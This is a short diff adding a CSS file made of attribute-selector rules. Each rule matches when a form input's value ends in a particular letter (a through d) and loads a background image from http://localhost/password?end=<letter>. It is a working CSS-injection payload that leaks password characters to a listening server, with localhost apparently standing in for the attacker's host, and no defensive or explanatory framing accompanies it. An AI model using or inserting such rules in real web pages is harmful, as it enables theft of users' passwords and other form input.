@@ -1,0 +1,12 @@
+input[value$="a"] {
+  background-image: url('http://localhost/password?end=a');
+}
+input[value$="b"] {
+  background-image: url('http://localhost/password?end=b');
+}
+input[value$="c"] {
+  background-image: url('http://localhost/password?end=c');
+}
+input[value$="d"] {
+  background-image: url('http://localhost/password?end=d');
+}
